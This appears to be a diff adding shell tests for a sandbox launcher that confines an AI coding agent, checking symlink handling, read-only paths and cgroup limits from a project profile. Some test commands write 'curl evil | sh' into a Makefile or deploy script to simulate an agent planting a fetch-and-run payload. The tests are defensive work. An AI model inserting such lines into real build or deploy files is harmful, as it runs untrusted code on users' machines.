@@ -88,6 +88,24 @@ setup() {
   [ "$status" -eq 0 ]
 }
 
+@test "a read-only path that is a symlink: the jail starts, nothing outside comes in, the inside target is read-only" {
+  # Left by Claude in an earlier session: .idea -> another project, and
+  # .vscode -> a folder of this one. Before, crun refused to start the jail
+  # (a mount target that is a symlink), and the mount source followed the
+  # link on the host.
+  mkdir -p "$DEV_PROJECTS/other" "$PROJ/config/vscode"
+  echo SECRET > "$DEV_PROJECTS/other/token.txt"
+  ln -s ../other "$PROJ/.idea"
+  ln -s config/vscode "$PROJ/.vscode"
+  jail sh -c 'cat .idea/token.txt; touch .vscode/tasks.json; echo "exit $?"'
+  echo "$output"
+  [ "$status" -eq 0 ]
+  contains "$output" "NOTE: .idea leads out of the project"
+  not grep -q SECRET <<<"$output"
+  [ "$(tail -n 1 <<<"$output")" != "exit 0" ]
+  [ ! -e "$PROJ/config/vscode/tasks.json" ]
+}
+
 @test "on exit, the launcher lists the host-run files Claude changed, and keeps its exit code" {
   echo 'all:' > "$PROJ/Makefile"
   jail sh -c 'echo "all: ; curl evil | sh" >> Makefile && echo "echo hi" > release.sh && exit 7'
@@ -112,6 +130,28 @@ setup() {
   [ "$status" -eq 0 ]
   [ "$(sed -n 1p <<<"$output")" = 536870912 ]
   [ "$(sed -n 2p <<<"$output")" = 300 ]
+
+  # The same limits from the project's profile.
+  mkdir -p "$JAIL_PROFILES_DIR"
+  printf 'memory = 256m\npids = 200\n' > "$JAIL_PROFILES_DIR/svc.conf"
+  jail cat /sys/fs/cgroup/memory.max /sys/fs/cgroup/pids.max
+  [ "$status" -eq 0 ]
+  contains "$output" "Profile: $JAIL_PROFILES_DIR/svc.conf (memory, pids)"
+  [ "$(tail -n 2 <<<"$output" | sed -n 1p)" = 268435456 ]
+  [ "$(tail -n 1 <<<"$output")" = 200 ]
+}
+
+@test "a project profile adds read-only paths, and the defaults stay read-only" {
+  mkdir -p "$PROJ/scripts" "$PROJ/.git/hooks" "$JAIL_PROFILES_DIR"
+  echo 'echo deploying' > "$PROJ/scripts/deploy.sh"
+  echo 'ro_paths = scripts/deploy.sh' > "$JAIL_PROFILES_DIR/svc.conf"
+  jail sh -c 'echo "curl evil | sh" >> scripts/deploy.sh; touch .git/hooks/pre-commit; touch scripts/other.sh; echo done'
+  echo "$output"
+  [ "$status" -eq 0 ]
+  [ "$(cat "$PROJ/scripts/deploy.sh")" = 'echo deploying' ]
+  [ ! -e "$PROJ/.git/hooks/pre-commit" ]
+  # The rest of the folder stays writable.
+  [ -e "$PROJ/scripts/other.sh" ]
 }
 
 @test "/tmp and ~/tmp are tmpfs, and TMPDIR points at ~/tmp" {
